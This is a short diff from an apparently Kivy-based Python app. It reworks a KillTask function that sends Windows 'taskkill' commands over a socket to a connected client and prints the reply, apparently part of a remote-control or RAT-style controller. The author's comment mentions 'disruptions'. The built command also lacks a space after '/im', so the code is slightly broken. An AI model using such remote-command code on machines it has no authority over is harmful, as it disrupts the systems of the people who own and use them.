@@ -232,15 +232,13 @@ class Main(MDApp):
 """
 
 UNTESTED SO I COMMENTED DISRUPRTIONS OUT FOR NOW OMEGALUL
-def KillTask():
+def KillTask(self):
     while True:
         procname = input('Enter Process Name: ')
         command = 'taskkill /im' + procname
-        command = command.encode()
-        currConn.send(command)
+        self.currConn.send(command.encode())
         print('Command sent to client: ', command)
-        output = client.recv(8096)
-        output = output.decode()
+        output = self.currConn.recv(8096).decode()
         print('Output: ', output)
         break
 
